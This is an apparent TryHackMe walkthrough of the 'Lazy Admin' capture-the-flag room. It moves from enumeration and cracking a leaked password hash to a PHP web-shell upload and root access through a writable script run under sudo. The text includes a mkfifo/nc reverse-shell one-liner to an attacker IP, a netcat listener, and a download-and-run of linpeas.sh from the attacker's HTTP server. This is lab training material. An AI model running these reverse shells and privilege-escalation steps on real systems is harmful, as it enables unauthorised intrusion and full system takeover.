# 🧑‍💻 Lazy Admin – TryHackMe Walkthrough

🔗 Room Link: https://tryhackme.com/room/lazyadmin

This walkthrough demonstrates a typical web application pentest involving **enumeration**, **credential cracking**, **file upload exploitation**, and **shell access**.

---

## 🔍 1. Enumeration

**Goal:** Discover open services and web directories.

### ✅ Nmap Scan

```bash
nmap -A -T4 <TARGET_IP>
Found:

Port 22 – SSH

Port 80 – HTTP

✅ Directory Brute Forcing with Gobuster
bash
Copy
Edit
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
Discovered /content directory

Then:

bash
Copy
Edit
gobuster dir -u http://<TARGET_IP>/content -w /usr/share/wordlists/dirb/common.txt
Found:

/as – Admin login page

/inc – Directory containing a MySQL backup file

🔑 2. Credential Discovery
Goal: Extract credentials from accessible resources.

✅ Download & Inspect MySQL Backup
Visit in browser or download using:

bash
Copy
Edit
wget http://<TARGET_IP>/content/inc/mysql_backup.sql
Inside the .sql file, found:

Username (e.g., manager)

Password hash (e.g., $2y$10$...)

✅ Crack Hash (Online or Locally)
Used CrackStation to crack the hash.

Result: Plain-text password (e.g., password123)

🔐 3. Login & File Upload Exploit
Goal: Get access to the admin panel and upload a web shell.

✅ Login to /as
Go to:

http://<TARGET_IP>/content/as

Use the recovered credentials

✅ Upload PHP Reverse Shell
Use php-reverse-shell.php from Pentestmonkey:

bash
Copy
Edit
cp /usr/share/webshells/php/php-reverse-shell.php .
Edit the file:

php
Copy
Edit
$ip = 'YOUR_LOCAL_IP';  // tun0 or eth0 IP
$port = 4444;
Upload via the admin panel

✅ Set Up Listener
bash
Copy
Edit
nc -lvnp 4444
✅ Trigger Shell
Visit the uploaded shell URL in browser:

http://<TARGET_IP>/content/uploads/php-reverse-shell.php

You should now receive a shell on your netcat listener.

🧪 4. Post-Exploitation
Goal: Explore the system and capture flags.

✅ Upgrade Shell (optional)
bash
Copy
Edit
python3 -c 'import pty; pty.spawn("/bin/bash")'
Then:

bash
Copy
Edit
Ctrl + Z
stty raw -echo; fg
export TERM=xterm
✅ Capture the Flag
bash
Copy
Edit
cat /home/<user>/user.txt
✅ Summary Table
Phase	Tool/Action	Command/URL
Enumeration	nmap, gobuster	nmap -A -T4 <IP>
gobuster dir -u ...
Credential Harvest	Inspect .sql file	wget http://<IP>/content/inc/mysql_backup.sql
Crack Password	CrackStation or John	Upload hash to crackstation.net
Web Login	Admin panel login	http://<IP>/content/as
Shell Access	PHP shell + Netcat	nc -lvnp 4444
Post-Exploit	Grab flag	cat /home/<user>/user.txt

💡 Notes
Always inspect .sql, .bak, .zip, or .log files if accessible via the web.

Verify upload success and execute reverse shell from browser.

Reverse shell IP should match your VPN/local interface IP (e.g., tun0 for TryHackMe).

5. Upload and run linpeas.sh for enumeration
Served linpeas.sh via HTTP on Kali:

bash
Copy
Edit
python3 -m http.server 8000
On target (reverse shell):

bash
Copy
Edit
cd /tmp
wget http://<KALI_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
linpeas.sh runs and reveals potential privilege escalation vectors.

6. Found sudo permissions for www-data
bash
Copy
Edit
sudo -l
Output:

ruby
Copy
Edit
User www-data may run (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data can run backup.pl as root without password.

7. Check contents of /home/itguy/backup.pl
bash
Copy
Edit
cat /home/itguy/backup.pl
The script runs /etc/copy.sh.

8. Check /etc/copy.sh file and its permissions
bash
Copy
Edit
cat /etc/copy.sh
Contains shell command that uses nc to open reverse shell to your machine.

File is writable, so we can replace it with our own reverse shell payload.

9. Insert reverse shell payload in /etc/copy.sh
On Kali, listen with:

bash
Copy
Edit
nc -lvnp 4444
On target, overwrite /etc/copy.sh with reverse shell payload:

bash
Copy
Edit
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 4444 >/tmp/f' > /etc/copy.sh
chmod +x /etc/copy.sh  # If possible
10. Run backup.pl with sudo to trigger reverse shell as root
bash
Copy
Edit
sudo /usr/bin/perl /home/itguy/backup.pl
Get root shell connection on your Kali listener.

11. Stabilize and upgrade shell interactivity
On target shell:

bash
Copy
Edit
python3 -c 'import pty; pty.spawn("/bin/bash")'
Background shell: Ctrl+Z

On Kali listener terminal:

bash
Copy
Edit
stty raw -echo
fg
export TERM=xterm
Now you have a fully interactive root shell.
